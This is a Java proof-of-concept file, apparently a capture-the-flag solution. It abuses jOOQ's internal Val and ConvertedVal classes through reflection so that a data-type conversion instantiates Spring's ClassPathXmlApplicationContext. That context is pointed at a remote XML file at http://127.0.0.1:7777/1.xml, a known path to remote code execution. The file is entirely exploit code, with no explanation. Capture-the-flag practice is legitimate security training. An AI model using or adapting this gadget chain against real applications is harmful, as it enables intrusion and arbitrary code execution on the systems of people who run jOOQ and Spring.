package com.aliyunctf.server.solution;

import org.jooq.DataType;
import org.jooq.SQLDialect;
import org.jooq.impl.DefaultDataType;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class MyPoc {
    public static void main(String[] args) throws Exception {
        DefaultDataType defaultDataType = new DefaultDataType<>(SQLDialect.MYSQL, ClassPathXmlApplicationContext.class, "any");
        Class<?> valC = Class.forName("org.jooq.impl.Val");
        Constructor<?> declaredConstructor = valC.getDeclaredConstructor(Object.class, DataType.class, boolean.class);
        declaredConstructor.setAccessible(true);
        Object val = declaredConstructor.newInstance("any", defaultDataType, false);
        Class<?> ConvertC = Class.forName("org.jooq.impl.ConvertedVal");
        Constructor<?> declaredConstructor1 = ConvertC.getDeclaredConstructors()[0];
        declaredConstructor1.setAccessible(true);
        Object converted = declaredConstructor1.newInstance(val, defaultDataType);

        Tools17.setFieldValue(val, "value", "http://127.0.0.1:7777/1.xml");

        Method getValue = ConvertC.getMethod("getValue");
        getValue.setAccessible(true);
        getValue.invoke(converted);
    }
}
